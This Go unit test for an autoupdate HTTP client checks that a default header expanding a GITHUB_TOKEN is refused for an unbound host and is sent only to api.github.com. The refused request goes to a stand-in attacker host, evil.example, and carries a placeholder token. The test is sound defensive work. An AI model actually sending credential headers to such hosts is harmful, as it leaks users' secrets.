package autoupdate

import (
	"context"
	"errors"
	"testing"
)

// Story 052 — S052-R1.2, run-time addition from the task-1 tech review: a
// default header (SetDefaultHeaders) goes through the same expansion as a
// custom one, so it is held to the same host binding.
func TestApplyHeaders_DefaultHeadersAreBound(t *testing.T) {
	t.Setenv("GITHUB_TOKEN", "ghp_example")

	c, bt := newBindingClient(t)
	c.SetDefaultHeaders(map[string]string{"X-Api-Key": "${GITHUB_TOKEN}"})

	resp, err := c.GetWithHeadersContext(context.Background(), "https://evil.example/latest", nil)
	if resp != nil && resp.Body != nil {
		_ = resp.Body.Close()
	}
	if !errors.Is(err, ErrCredentialHostMismatch) {
		t.Fatalf("err = %v; want ErrCredentialHostMismatch for a default header", err)
	}
	if n := len(bt.sent()); n != 0 {
		t.Errorf("%d request(s) reached the transport; want 0", n)
	}

	// Converse: the same default header to a bound host is expanded.
	resp, err = c.GetWithHeadersContext(context.Background(), "https://api.github.com/repos/o/r", nil)
	if err != nil {
		t.Fatalf("bound host refused: %v", err)
	}
	_ = resp.Body.Close()
	sent := bt.sent()
	if len(sent) != 1 || sent[0].Header.Get("X-Api-Key") != "ghp_example" {
		t.Errorf("api.github.com received %d request(s); want one carrying the token", len(sent))
	}
}
